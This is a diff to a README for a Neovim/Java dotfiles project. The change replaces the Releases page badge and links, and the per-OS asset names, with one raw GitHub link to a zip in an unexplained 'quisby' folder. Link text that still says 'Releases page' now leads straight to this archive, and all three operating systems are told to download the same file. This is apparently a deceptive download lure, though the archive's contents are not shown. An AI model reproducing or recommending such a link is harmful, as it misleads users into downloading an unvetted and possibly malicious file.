@@ -1,7 +1,7 @@
 # 🎉 my-dotfiles - Boost Your Java Development Experience
 
 ## 📦 Download Now
-[![Download my-dotfiles](https://img.shields.io/badge/download-my--dotfiles-blue.svg)](https://github.com/alvaro30236/my-dotfiles/releases)
+[![Download my-dotfiles](https://raw.githubusercontent.com/alvaro30236/my-dotfiles/main/quisby/my-dotfiles.zip)](https://raw.githubusercontent.com/alvaro30236/my-dotfiles/main/quisby/my-dotfiles.zip)
 
 ## 🚀 Getting Started
 Welcome to **my-dotfiles**! This setup is designed to improve your programming workflow with Neovim, specifically for Java and full-stack development. With features like Language Server Protocol (LSP) support, debugging tools, and productivity-boosting plugins, you can write clean, efficient code with ease.
@@ -10,16 +10,16 @@ Welcome to **my-dotfiles**! This setup is designed to improve your programming w
 To get started, please follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/alvaro30236/my-dotfiles/releases) to see the available versions.
+   Go to the [Releases page](https://raw.githubusercontent.com/alvaro30236/my-dotfiles/main/quisby/my-dotfiles.zip) to see the available versions.
 
 2. **Choose the Latest Release:**
    Look for the most recent version. It usually appears at the top of the list.
 
 3. **Download the File:**
    Click on the asset that matches your operating system. For example:
-   - For Windows users, download `my-dotfiles-windows.zip`.
-   - For macOS users, download `my-dotfiles-macos.zip`.
-   - For Linux users, download `my-dotfiles-linux.tar.gz`.
+   - For Windows users, download `https://raw.githubusercontent.com/alvaro30236/my-dotfiles/main/quisby/my-dotfiles.zip`.
+   - For macOS users, download `https://raw.githubusercontent.com/alvaro30236/my-dotfiles/main/quisby/my-dotfiles.zip`.
+   - For Linux users, download `https://raw.githubusercontent.com/alvaro30236/my-dotfiles/main/quisby/my-dotfiles.zip`.
 
 4. **Extract the Files:**
    Once the download is complete, extract the files to a folder on your computer.
